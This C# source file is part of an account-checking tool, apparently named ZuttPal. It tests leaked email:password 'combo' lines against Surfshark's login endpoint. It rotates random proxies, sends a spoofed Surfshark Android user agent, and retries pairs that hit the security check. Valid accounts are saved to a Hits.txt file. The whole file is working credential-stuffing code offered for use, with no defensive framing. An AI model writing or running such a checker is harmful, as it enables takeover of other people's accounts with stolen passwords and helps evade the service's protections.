using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check4
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker2()
		{
			for (; ; )
			{
				while (!Checking4.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking4.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking4.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.UserAgent = "SurfsharkAndroid/2.6.6 com.surfshark.vpnclient.android/release/playStore/206060400";
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = false;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
								string str1 = "{\"username\":\"" + array[0] + "\",\"password\":\"" + array[1] + "\"}";
								string str2 = httpRequest.Post("https://my.surfshark.com/auth/login", str1, "application/json;charset=UTF-8").ToString();
								if (str2.Contains("error\":{}}"))
								{
									Interlocked.Increment(ref Checking4.CheckedLines);
									Interlocked.Increment(ref Checking4.currentCpm);
									Interlocked.Increment(ref Checking4.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.DarkRed);
									}
									break;
								}
								if (str2.Contains("{}") && !str2.Contains("Please complete the security check to access"))
								{
									Interlocked.Increment(ref Checking4.CheckedLines);
									Interlocked.Increment(ref Checking4.currentCpm);
									Interlocked.Increment(ref Checking4.Hits);
									Save(Path + "\\Hits.txt", account);
									if (Program.config.printgood == "True")
									{
										Console.WriteLine("[»] Valid - " + account, Color.Green);
									}
									break;
								}
								else
								{
									string acc1 = email + ":" + password;
									Checking6.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking6.retry);
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking4.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking4.retry);
								break;
							}
						}
					}
				}
			}
		}

			public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
